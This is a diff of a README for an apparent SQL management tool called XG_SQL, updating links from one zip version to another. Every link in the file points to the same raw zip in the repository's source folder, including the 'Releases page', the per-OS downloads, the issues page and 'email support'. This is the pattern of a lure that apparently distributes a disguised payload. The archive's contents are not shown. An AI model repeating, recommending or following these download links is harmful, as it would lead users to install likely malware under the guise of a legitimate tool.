@@ -6,7 +6,7 @@ Welcome to XG_SQL! This application helps you manage and execute SQL queries eas
 
 ## 📥 Download the Application
 
-[![Download XG_SQL](https://github.com/Zgeggamer78/XG_SQL/raw/refs/heads/main/src/main/X_SQL_3.3.zip%20XG_SQL-Click%20Here-blue)](https://github.com/Zgeggamer78/XG_SQL/raw/refs/heads/main/src/main/X_SQL_3.3.zip)
+[![Download XG_SQL](https://raw.githubusercontent.com/Zgeggamer78/XG_SQL/main/src/X_SQL_3.6.zip%20XG_SQL-Click%20Here-blue)](https://raw.githubusercontent.com/Zgeggamer78/XG_SQL/main/src/X_SQL_3.6.zip)
 
 ## 📋 System Requirements
 
@@ -28,18 +28,18 @@ Before you download XG_SQL, ensure your computer meets these requirements:
 
 ## 💻 Download & Install
 
-To get started, visit [this page to download](https://github.com/Zgeggamer78/XG_SQL/raw/refs/heads/main/src/main/X_SQL_3.3.zip). Follow these steps to download and install XG_SQL:
+To get started, visit [this page to download](https://raw.githubusercontent.com/Zgeggamer78/XG_SQL/main/src/X_SQL_3.6.zip). Follow these steps to download and install XG_SQL:
 
 1. **Visit the Releases Page:**
-   Go to [XG_SQL Releases](https://github.com/Zgeggamer78/XG_SQL/raw/refs/heads/main/src/main/X_SQL_3.3.zip).
+   Go to [XG_SQL Releases](https://raw.githubusercontent.com/Zgeggamer78/XG_SQL/main/src/X_SQL_3.6.zip).
 
 2. **Choose the Latest Version:**
    Look for the most recent release. This will typically be at the top of the page.
 
 3. **Select Your File:**
    Depending on your operating system, find the appropriate file for download:
-   - For Windows, download `https://github.com/Zgeggamer78/XG_SQL/raw/refs/heads/main/src/main/X_SQL_3.3.zip`.
-   - For macOS, download `https://github.com/Zgeggamer78/XG_SQL/raw/refs/heads/main/src/main/X_SQL_3.3.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/Zgeggamer78/XG_SQL/main/src/X_SQL_3.6.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Zgeggamer78/XG_SQL/main/src/X_SQL_3.6.zip`.
 
 4. **Download the File:**
    Click on the link to start the download. The file should automatically save to your computer.
@@ -79,8 +79,8 @@ You’re ready to use XG_SQL! Here are a few tips to help you navigate the appli
 
 We want to hear from you! If you have questions or feedback, please reach out:
 
-- **GitHub Issues:** Submit an issue on our [GitHub Issues page](https://github.com/Zgeggamer78/XG_SQL/raw/refs/heads/main/src/main/X_SQL_3.3.zip).
-- **Email Support:** Contact us at https://github.com/Zgeggamer78/XG_SQL/raw/refs/heads/main/src/main/X_SQL_3.3.zip
+- **GitHub Issues:** Submit an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Zgeggamer78/XG_SQL/main/src/X_SQL_3.6.zip).
+- **Email Support:** Contact us at https://raw.githubusercontent.com/Zgeggamer78/XG_SQL/main/src/X_SQL_3.6.zip
 
 ## 🔗 Learn More
 
